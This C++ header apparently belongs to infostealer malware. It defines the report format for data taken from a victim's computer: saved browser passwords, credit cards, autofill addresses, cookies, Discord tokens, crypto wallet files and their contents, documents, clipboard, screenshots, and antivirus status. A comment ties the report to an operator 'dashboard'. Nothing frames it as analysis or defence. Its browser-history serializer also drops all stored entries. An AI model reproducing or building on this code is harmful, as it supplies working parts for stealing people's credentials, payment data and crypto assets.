#pragma once
#include <string>
#include <vector>
#include <optional>
#include "nlohmann/json.hpp"

using json = nlohmann::json;

// --- Data Structures (equivalent to Kotlin @Serializable classes) ---

struct LocationInfo {
    std::string countryName;
    std::string cityName;
    double latitude;
    double longitude;
    std::string ipAddress;

    json to_json() const {
        return {
            {"countryName", countryName},
            {"cityName", cityName},
            {"latitude", latitude},
            {"longitude", longitude},
            {"ipAddress", ipAddress}
        };
    }
};

struct InstalledApp {
    std::string name;
    bool found;

    json to_json() const {
        return {
            {"name", name},
            {"found", found}
        };
    }
};

struct HistoryEntry {
    std::string url;
    std::optional<std::string> title;

    json to_json() const {
        json j = {{"url", url}};
        if (title) j["title"] = *title;
        return j;
    }
};

struct BrowserHistory {
    std::vector<HistoryEntry> chromeHistory;
    std::vector<HistoryEntry> firefoxHistory;
    std::vector<HistoryEntry> edgeHistory;
    std::vector<HistoryEntry> operaHistory;
    std::vector<HistoryEntry> braveHistory;

    json to_json() const {
        return {
            {"chromeHistory", json::array()},
            {"firefoxHistory", json::array()},
            {"edgeHistory", json::array()},
            {"operaHistory", json::array()},
            {"braveHistory", json::array()}
        };
    }
};

struct RunningProcess {
    std::string imageName;
    std::string pid;
    std::string sessionName;
    std::string sessionNum;
    std::string memUsage;

    json to_json() const {
        return {
            {"imageName", imageName},
            {"pid", pid},
            {"sessionName", sessionName},
            {"sessionNum", sessionNum},
            {"memUsage", memUsage}
        };
    }
};

struct CpuInfo {
    std::string name;
    std::string vendor;
    int cores;
    int threads;
    std::string maxClockSpeed;
    std::string architecture;

    json to_json() const {
        return {
            {"name", name},
            {"vendor", vendor},
            {"cores", cores},
            {"threads", threads},
            {"maxClockSpeed", maxClockSpeed},
            {"architecture", architecture}
        };
    }
};

struct GpuInfo {
    std::string name;
    std::optional<std::string> driverVersion;
    std::optional<std::string> memory;

    json to_json() const {
        json j = {{"name", name}};
        if (driverVersion) j["driverVersion"] = *driverVersion;
        if (memory) j["memory"] = *memory;
        return j;
    }
};

struct AntivirusInfo {
    std::string name;
    std::string status;
    bool enabled;

    json to_json() const {
        return {
            {"name", name},
            {"status", status},
            {"enabled", enabled}
        };
    }
};

struct SystemInfo {
    // Basic Info
    std::optional<std::string> installationPath;
    std::optional<std::string> os;
    std::optional<std::string> osVersion;
    std::optional<std::string> osArchitecture;
    std::optional<std::string> osInstallDate;
    
    // Computer Identity
    std::optional<std::string> computerName;
    std::optional<std::string> hostname;
    std::optional<std::string> netbiosName;
    std::optional<std::string> username;
    std::optional<std::string> domain;
    std::optional<std::string> hwid;
    
    // Hardware
    std::optional<CpuInfo> cpu;
    std::vector<GpuInfo> gpu;
    std::optional<std::string> ram;
    
    // Time & Locale
    std::optional<std::string> timeZone;
    std::optional<std::string> systemLanguage;
    
    // Security
    bool isElevated = false;
    std::vector<AntivirusInfo> antiviruses;
    std::optional<std::string> windowsDefenderStatus;
    
    // Network
    std::optional<std::string> networkDomain;
    
    // Extras
    std::optional<std::string> clipboard;
    std::optional<std::string> screenshot; // Base64 encoded

    json to_json() const {
        json j = {{"gpu", json::array()}, {"antiviruses", json::array()}};
        
        if (installationPath) j["installationPath"] = *installationPath;
        if (os) j["os"] = *os;
        if (osVersion) j["osVersion"] = *osVersion;
        if (osArchitecture) j["osArchitecture"] = *osArchitecture;
        if (osInstallDate) j["osInstallDate"] = *osInstallDate;
        
        if (computerName) j["computerName"] = *computerName;
        if (hostname) j["hostname"] = *hostname;
        if (netbiosName) j["netbiosName"] = *netbiosName;
        if (username) j["username"] = *username;
        if (domain) j["domain"] = *domain;
        if (hwid) j["hwid"] = *hwid;
        
        if (cpu) j["cpu"] = cpu->to_json();
        for (const auto& gpu_info : gpu) {
            j["gpu"].push_back(gpu_info.to_json());
        }
        if (ram) j["ram"] = *ram;
        
        if (timeZone) j["timeZone"] = *timeZone;
        if (systemLanguage) j["systemLanguage"] = *systemLanguage;
        
        j["isElevated"] = isElevated;
        for (const auto& av : antiviruses) {
            j["antiviruses"].push_back(av.to_json());
        }
        if (windowsDefenderStatus) j["windowsDefenderStatus"] = *windowsDefenderStatus;
        
        if (networkDomain) j["networkDomain"] = *networkDomain;
        
        if (clipboard) j["clipboard"] = *clipboard;
        if (screenshot) j["screenshot"] = *screenshot;
        
        return j;
    }
};

struct SavedPassword {
    std::string origin;
    std::string username;
    std::string password;

    json to_json() const {
        return {
            {"origin", origin},
            {"username", username},
            {"password", password}
        };
    }
};

struct CreditCard {
    std::string nameOnCard;
    std::string cardNumber;
    std::string expirationMonth;
    std::string expirationYear;
    std::string billingAddress;

    json to_json() const {
        return {
            {"nameOnCard", nameOnCard},
            {"cardNumber", cardNumber},
            {"expirationMonth", expirationMonth},
            {"expirationYear", expirationYear},
            {"billingAddress", billingAddress}
        };
    }
};

struct AutofillAddress {
    std::string fullName;
    std::string company;
    std::string addressLine1;
    std::string addressLine2;
    std::string city;
    std::string state;
    std::string zipCode;
    std::string country;
    std::string phone;
    std::string email;

    json to_json() const {
        return {
            {"fullName", fullName},
            {"company", company},
            {"addressLine1", addressLine1},
            {"addressLine2", addressLine2},
            {"city", city},
            {"state", state},
            {"zipCode", zipCode},
            {"country", country},
            {"phone", phone},
            {"email", email}
        };
    }
};

struct CryptoWalletFile {
    std::string walletName;
    std::string walletType;
    std::string filePath;
    long long fileSize;
    std::string lastModified;
    std::optional<std::string> fileContent;

    json to_json() const {
        json j = {
            {"walletName", walletName},
            {"walletType", walletType},
            {"filePath", filePath},
            {"fileSize", fileSize},
            {"lastModified", lastModified}
        };
        if (fileContent) j["fileContent"] = *fileContent;
        return j;
    }
};

struct CryptoWalletFolder {
    std::string walletName;
    std::string folderPath;
    long long totalSize;
    std::string lastModified;

    json to_json() const {
        return {
            {"walletName", walletName},
            {"folderPath", folderPath},
            {"totalSize", totalSize},
            {"lastModified", lastModified}
        };
    }
};

struct ImportantFile {
    std::string fileName;
    std::string fileType;
    std::string filePath;
    long long fileSize;
    std::string lastModified;
    std::optional<std::string> fileContent;

    json to_json() const {
        json j = {
            {"fileName", fileName},
            {"fileType", fileType},
            {"filePath", filePath},
            {"fileSize", fileSize},
            {"lastModified", lastModified}
        };
        if (fileContent) j["fileContent"] = *fileContent;
        return j;
    }
};

struct PcData {
    std::optional<std::string> user;
    std::string screenSize;
    std::string dateTime;
    std::string ipAddress;
    std::optional<LocationInfo> location;
    std::vector<RunningProcess> runningProcesses;
    std::vector<InstalledApp> installedApps;
    BrowserHistory browserHistory;
    std::optional<std::string> browserCookies;
    std::optional<std::vector<SavedPassword>> savedPasswords;
    std::optional<std::vector<CreditCard>> creditCards;
    std::optional<std::vector<AutofillAddress>> autofillAddresses;
    std::optional<std::vector<std::string>> discordTokens;
    std::optional<SystemInfo> systemInfo;
    std::optional<std::vector<CryptoWalletFile>> cryptoWallets;
    std::optional<std::vector<CryptoWalletFolder>> cryptoWalletFolders;
    std::optional<std::vector<ImportantFile>> importantFiles;

    json to_json() const {
        json j = {
            {"screenSize", screenSize},
            {"dateTime", dateTime},
            {"ipAddress", ipAddress},
            {"runningProcesses", json::array()},
            {"installedApps", json::array()},
            {"browserHistory", browserHistory.to_json()}
        };

        // Always include user field if set and not empty at all (must match username for logs to appear in dashboard)
        // This is critical - if user field is missing or empty, logs won't be visible in the dashboard
        if (user.has_value() && !user->empty()) {
            j["user"] = *user;
        }
        if (location) j["location"] = location->to_json();
        for (const auto& proc : runningProcesses) {
            j["runningProcesses"].push_back(proc.to_json());
        }
        for (const auto& app : installedApps) {
            j["installedApps"].push_back(app.to_json());
        }
        if (browserCookies) j["browserCookies"] = *browserCookies;
        if (savedPasswords) {
            j["savedPasswords"] = json::array();
            for (const auto& pwd : *savedPasswords) {
                j["savedPasswords"].push_back(pwd.to_json());
            }
        }
        if (creditCards) {
            j["creditCards"] = json::array();
            for (const auto& card : *creditCards) {
                j["creditCards"].push_back(card.to_json());
            }
        }
        if (autofillAddresses) {
            j["autofillAddresses"] = json::array();
            for (const auto& addr : *autofillAddresses) {
                j["autofillAddresses"].push_back(addr.to_json());
            }
        }
        if (discordTokens) {
            j["discordTokens"] = *discordTokens;
        }
        if (systemInfo) j["systemInfo"] = systemInfo->to_json();
        if (cryptoWallets) {
            j["cryptoWallets"] = json::array();
            for (const auto& wallet : *cryptoWallets) {
                j["cryptoWallets"].push_back(wallet.to_json());
            }
        }
        if (cryptoWalletFolders) {
            j["cryptoWalletFolders"] = json::array();
            for (const auto& folder : *cryptoWalletFolders) {
                j["cryptoWalletFolders"].push_back(folder.to_json());
            }
        }
        if (importantFiles) {
            j["importantFiles"] = json::array();
            for (const auto& file : *importantFiles) {
                j["importantFiles"].push_back(file.to_json());
            }
        }

        return j;
    }
};
